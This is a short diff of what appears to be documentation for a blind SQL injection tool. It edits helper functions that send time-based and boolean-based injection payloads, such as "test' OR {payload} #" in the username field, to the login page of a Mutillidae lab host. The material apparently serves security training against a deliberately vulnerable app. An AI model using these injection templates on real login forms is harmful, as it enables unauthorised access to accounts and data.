@@ -17,7 +17,7 @@ This function include then target specific logic (encodage, token, method, ...)
 ```python
 sleep_duration = 1
 
-def exec_request(request: str) -> bool:
+def exec_request(request: str, sleep_duration:int) -> bool:
     url = "http://meta.local/mutillidae/index.php?page=login.php"
     datas = {
         'username': f"test' AND {request} #",
@@ -31,7 +31,7 @@ def exec_request(request: str) -> bool:
 ##### Boolean Based Injection
 
 ```python
-def exec_request(payload: str) -> bool:
+def exec_request(payload: str, sleep_duration:int) -> bool:
     url = "http://meta.local/mutillidae/index.php?page=login.php"
     datas = {
         'username': f"test' OR {payload} # ",
